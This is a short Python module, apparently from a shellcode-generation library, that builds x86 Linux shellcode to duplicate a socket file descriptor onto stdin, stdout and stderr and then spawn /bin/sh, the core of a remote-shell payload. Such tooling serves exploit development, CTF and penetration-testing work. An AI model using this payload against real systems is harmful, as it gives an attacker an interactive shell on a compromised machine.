from shellcraft import *

def main(loader = ''):
    """Args: [loader]
    !! File descriptor must be placed in EBX.
    Sets stdin, stdout and stderr to file descriptor and spawns /bin/sh."""
    return ''.join([asm(loader),
                    template('linux/dup.asm', {}), # clears ECX
                    template('linux/sh.asm', {})
                    ])
